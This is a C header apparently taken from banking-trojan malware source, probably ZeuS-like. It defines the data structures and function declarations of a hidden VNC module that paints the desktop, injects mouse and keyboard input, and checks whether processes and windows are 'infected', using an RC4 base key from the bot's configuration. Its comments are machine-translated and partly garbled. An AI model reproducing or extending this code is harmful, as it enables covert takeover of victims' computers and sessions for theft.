/*
  Внутринни данные VNC.
*/
#pragma once

#if(BO_VNC > 0)

//The maximum size of the bitmap.
#define MAX_BITMAP_SIZE (4000 * 4000 * 4)

//Time dablklika.
#define MOUSE_DOUBLE_CLICK_DELAY 1000

//Timeout for SendMessageTimeoutW ().
#define SENDMESSAGE_TIMEOUT 100

//Condition that the flow not worked in the VNC-desktop.
#define IS_VNC_PROCESS (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE && Core::isActive())

//Message Types VNC (wParam).
enum vncMessages:WPARAM
{
  VMW_EXECUTE_MENU    = (WPARAM)-1, //Execute the menu command
  VMW_HILITE_MENU     = (WPARAM)-2, //Podtsvetit menu command.
  VMW_UPDATE_KEYSTATE = (WPARAM)-3, //Update the state of the keys for the stream.
  VMW_REMOTE_PAINT    = (WPARAM)-4  //Draw the udalennoeokno ukaznoe in lParam
};

//Flags window class.
enum
{
  WCF_PAINTMETHOD_NOP         = 0x01, //Do not draw.
  WCF_PAINTMETHOD_PAINT       = 0x02, //Interception BeginPaint / EndPaint etc.
  WCF_PAINTMETHOD_PRINT       = 0x04, //WM_PRINT.
  WCF_PAINTMETHOD_PRINTWINDOW = 0x08, //PrintWindow.
  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //РќРµ РІС‹Р·С‹РІР°С‚ С‡РµСЂРµР· VNCPROCESSDATA.vncMessage.

  WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //Send all mouse messages with coordinates otnostelno screen.
  WCF_MOUSE_AUTOCAPTURE       = 0x40, //Automatically exchange SetCapture hover myshy hit the window.
};

//Global data VNC, proektiruyutsya as OBJECT_ID_VNC_DATA_MAPFILE.
typedef struct
{
  BYTE keysState[256];      //Sosotoyanie mouse buttons and keyboard.
  POINT cursorPoint;        //Koordinty cursor.
  
  //Data to emulate SetCapture ().
  struct
  {
    HWND window; //Window with ustanvlennym grip.
    DWORD tid;   //TID window to capture.
    WORD area;   //Region from which the seizure began, serves only to Mixing Capacity windows.
  }mouseCapture;

  //The data for the process of drawing.
  struct
  {
    RECT ownerRect;  //The coordinates of the parent window.
    bool retVal;     //Return code of drawing.
  }paintProcess;
}VNCGLOBALDATA;

//These VNC-process.
typedef struct
{
  HANDLE mapFileHandle;      //The handle of the map-file for all processes. (Core:: OBJECT_ID_VNC_MAPFILE)
  DWORD tlsPaintIndex;       //TLS-index PAINTDATA.
  DWORD vncMessage;          //Window message to copy the contents of a window or obnvoleniya state of global data
  HANDLE vncMessageEvent;    //Event end meet the following vncMessage.
  VNCGLOBALDATA *globalData; //Global data.
  HANDLE globalDataMutex;    //Myuteks for globaData.
  
  //Data to work with DIB.
  struct
  {
    LPBYTE desktop;       //Bitmap desktop, which is drawn for the VNC-client.

    //Temporary bitmap, which is drawn each window separately.
    HBITMAP tempHandle;   //Handle.
    LPBYTE temp;          //Bytes.

    RECT rect;            //The coordinates of the desktop (0, 0, width, height).
    DWORD widthInBytes;   //Width of bitmap in pixels, including the alignment.
    BYTE pixelSize;       //Pixel size in bytes.
  }dib;

  //These VNC-client. Used the server chastyuy.
  struct
  {    
    //Data necessary to detect infected processes.
    struct
    {
      GUID osGuid;             //PESETTINGS.osGuid.

      DWORD processInfecionId; //PESETTINGS.processInfecionId.

      Crypt::RC4KEY baseKey;   //BASECONFIG.rc4Key.

    }processDetectionData;

    //DC
    struct
    {
      HDC dc;                            //Memory DC which will be painted on the desktop.
      HBITMAP orginalBitmap;             //Originally bitmap.
      HBITMAP sampleBitmap;              //Kolichetsvo bitmap with the correct color.
      HANDLE paintMutex;                 //Myuteks drawing windows.
    }dcData;

    //State of the mouse.
    struct
    {
      DWORD lastDownTime;      //Time poslednengo click.
      DWORD lastDownMessage;   //Your Message last click.
      HWND lastDownWindow;     //Window, which was produced by pressing.
      HWND lastTopLevelWindow; //Last TOP-box in which prishodilo depression.
      HWND lastActiveWindow;
      DWORD lastActiveThreadId;
    }input;

    PROCESS_INFORMATION paintProcess; //These process of drawing.
  }serverData;
}VNCPROCESSDATA;

extern VNCPROCESSDATA vncActiveProcessData;

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//Function.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

/*
  Рисование декстопа.

  IN vncProcessData - VNCPROCESSDATA.
*/
void paintDesktop(VNCPROCESSDATA *vncProcessData);

/*
  Рисование окна.
  
  IN vncProcessData - VNCPROCESSDATA.
  IN window         - окно для печати.
  IN visibleRect    - видимая область для окна.
  IN isServer       - true - функция вызвана с сервера,
                      false - функция вызвана с зараженного процесса.
  
  Return            - true - окно нарисовано/пропущено,
                      false - окно не нарисовано.
*/
bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer);

/*
  Обработка сообщений мыши.

  IN vncProcessData - VNCPROCESSDATA.
  IN flags          - Rfb::MOUSEEVENTF_*.
  IN x              - X.
  IN y              - Y.
  IN data           - допольнительные данные, согласно протоколу RFB.
*/
void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data);

/*
  Обработка сообщений клавиатуры.

  IN vncProcessData - VNCPROCESSDATA.
  IN keySym         - KeySym.
  IN down           - true - нажатие, false - отпсукание.
*/
void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down);

/*
  Обновление состояние кнопок мыши и клавиатуры.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN virtualKey         - клавиша для изменения, 0 - если не чего изменять не нужно.
  IN down               - true - нажать клавишу, false - отпустить клавишу.

  Return                - текущая маска MK_* для мышиных сообщений.
*/
WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down);

/*
  Выбираем метод рисования окна.

  IN window - окно.

  Return - PWM_*.
*/
WORD getWindowClassFlags(HWND window);

/*В В Inifitsirovan checks whether the process window.

В В IN vncProcessData - VNCPROCESSDATA.
В В IN window - the window.

В В Return - true - inifitsirovan,
В В В В В В В В В В В В В В В В В В В В В В false - do not inifitsirovan.*/
bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window);

#endif
